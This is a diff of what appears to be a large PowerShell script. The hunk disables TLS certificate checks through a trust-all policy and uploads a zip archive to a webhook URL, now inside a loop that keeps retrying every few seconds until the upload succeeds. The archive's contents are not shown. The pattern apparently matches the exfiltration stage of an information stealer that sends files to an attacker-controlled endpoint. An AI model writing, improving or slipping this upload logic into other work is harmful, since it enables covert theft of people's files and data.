@@ -1148,24 +1148,29 @@ public class TrustAllCertsPolicy : ICertificatePolicy {
         
         [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
 
-        $httpClient = [Net.Http.HttpClient]::new()
-        $multipartContent = [Net.Http.MultipartFormDataContent]::new()
-        
-        $fileStream = [IO.File]::OpenRead($zipFilePath)
-        $fileContent = [Net.Http.StreamContent]::new($fileStream)
-        $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
-        $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
-        
         $went_through = $false
         while (-not $went_through) {
             try {
+                $httpClient = [Net.Http.HttpClient]::new()
+                $multipartContent = [Net.Http.MultipartFormDataContent]::new()
+
+                $fileStream = [IO.File]::OpenRead($zipFilePath)
+                $fileContent = [Net.Http.StreamContent]::new($fileStream)
+
+                $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+
+                $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
+
                 $response = $httpClient.PostAsync($webhook, $multipartContent).Result
                 $responseContent = $response.Content.ReadAsStringAsync().Result
+
                 Write-Host $responseContent
+
                 $went_through = $true
             }
             catch {
-                $sleepTime = Get-Random -Minimum 30 -Maximum 120
+                $sleepTime = Get-Random -Minimum 5 -Maximum 10
+                Write-Host "[!] An error occurred, retrying in $sleepTime seconds" -ForegroundColor Yellow
                 Start-Sleep -Seconds $sleepTime
             }
         }
